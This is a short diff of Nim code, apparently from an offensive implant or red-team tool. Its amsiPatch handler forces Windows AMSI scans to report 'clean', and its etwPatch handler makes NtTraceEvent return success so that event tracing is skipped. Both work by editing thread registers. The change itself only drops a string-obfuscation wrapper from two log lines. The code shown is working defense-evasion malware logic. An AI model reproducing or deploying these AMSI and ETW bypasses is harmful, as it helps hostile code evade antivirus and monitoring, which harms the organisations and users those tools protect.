@@ -19,14 +19,14 @@ import ../../common/[types, utils]
 proc amsiPatch(pThreadCtx: PCONTEXT) = 
     # Set the AMSI_RESULT parameter to 0 (AMSI_RESULT_CLEAN)
     SETPARAM_6(pThreadCtx, cast[PULONG](0))
-    print protect("    [+] AMSI_SCAN_RESULT set to AMSI_RESULT_CLEAN")
+    print "    [+] AMSI_SCAN_RESULT set to AMSI_RESULT_CLEAN"
     CONTINUE_EXECUTION(pThreadCtx)
 
 proc etwPatch(pThreadCtx: PCONTEXT) = 
     pThreadCtx.Rip = cast[PULONG_PTR](pThreadCtx.Rsp)[]
     pThreadCtx.Rsp += sizeof(PVOID)
     pThreadCtx.Rax = STATUS_SUCCESS
-    print protect("    [+] Return value of NtTraceEvent set to STATUS_SUCCESS")
+    print "    [+] Return value of NtTraceEvent set to STATUS_SUCCESS"
     CONTINUE_EXECUTION(pThreadCtx)
 
 #[
